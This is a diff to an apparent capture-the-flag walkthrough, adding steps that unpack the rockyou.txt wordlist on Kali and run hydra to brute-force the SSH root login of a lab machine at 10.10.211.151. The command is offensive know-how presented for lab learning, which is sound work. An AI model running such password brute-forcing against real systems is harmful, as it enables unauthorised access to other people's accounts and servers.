@@ -69,3 +69,21 @@ Nmap done: 1 IP address (1 host up) scanned in 5.10 seconds
 ```
 3. You will get the first flag in ```/home/melodias/user.txt```
 
+## Brute-forcing
+4.  Unzip your rockyou.txt if it is still zipped in kali.
+```bash
+root@kali:~# /usr/share/wordlists/
+bash: /usr/share/wordlists/: Is a directory
+root@kali:~# cd/usr/share/wordlists/
+bash: cd/usr/share/wordlists/: No such file or directory
+root@kali:~# cd /usr/share/wordlists/
+root@kali:/usr/share/wordlists# ls
+dirb       fasttrack.txt  metasploit  rockyou.txt.gz
+dirbuster  fern-wifi      nmap.lst    wfuzz
+root@kali:/usr/share/wordlists# gunzip rockyou.txt.gz
+```
+
+5. Use ```hydra``` to bruteforce the ssh root login.
+```bash
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.211.151
+```
